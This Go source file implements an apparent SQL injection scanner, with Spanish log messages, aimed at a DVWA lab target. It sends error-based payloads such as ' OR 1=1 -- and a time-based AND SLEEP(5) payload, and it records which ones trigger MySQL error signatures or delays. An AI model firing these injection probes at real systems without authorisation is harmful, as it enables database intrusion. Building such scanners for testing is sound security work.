package scanner

import (
	"io"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/LeirBaGMC/sql-scanner/database" 
)


func RunScan(scanID string, targetURL string) {
	log.Printf("Iniciando escaneo %s para la URL: %s", scanID, targetURL)

	
	targetURL = strings.Replace(targetURL, "localhost:8000", "dvwa", 1)
	database.DB.Exec("UPDATE scans SET status = ? WHERE id = ?", "En ejecución", scanID)

	client := &http.Client{Timeout: 10 * time.Second}
	

	
	log.Println("Probando inyección SQL basada en errores...")
	errorPayloads := []string{"'", "\"", ";", " OR 1=1 --", ")"}
	errorSignatures := []string{"You have an error in your SQL syntax", "unclosed quotation mark", "mysql_fetch"}

	for _, payload := range errorPayloads {
		
		req, err := http.NewRequest("GET", targetURL+payload, nil)
		if err != nil {
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		bodyBytes, _ := io.ReadAll(resp.Body)
		bodyString := string(bodyBytes)

		for _, signature := range errorSignatures {
			if strings.Contains(bodyString, signature) {
				log.Printf("¡VULNERABILIDAD ENCONTRADA! Tipo: Basado en Errores, Payload: %s", payload)
				database.DB.Exec("INSERT INTO vulnerabilities (scan_id, url, type, payload) VALUES (?, ?, ?, ?)",
					scanID, targetURL, "Basado en Errores", payload)

				
				break
			}
		}
		
	}

	
	log.Println("Probando inyección SQL basada en tiempo...")

	timePayload := " AND SLEEP(5)--"
	expectedDelay := 5 * time.Second
	margin := 500 * time.Millisecond

	startTime := time.Now()
	req, err := http.NewRequest("GET", targetURL+timePayload, nil)
	if err == nil {
		resp, err := client.Do(req)
		if err == nil {
			resp.Body.Close()
		}
	}
	duration := time.Since(startTime)

	if duration >= (expectedDelay-margin) && duration < client.Timeout {
		log.Printf("¡VULNERABILIDAD ENCONTRADA! Tipo: Basado en Tiempo, Payload: %s", timePayload)
		database.DB.Exec("INSERT INTO vulnerabilities (scan_id, url, type, payload) VALUES (?, ?, ?, ?)",
			scanID, targetURL, "Basado en Tiempo", timePayload)
	}


	database.DB.Exec("UPDATE scans SET status = ? WHERE id = ?", "Completado", scanID)
	log.Printf("Escaneo %s completado.", scanID)
}
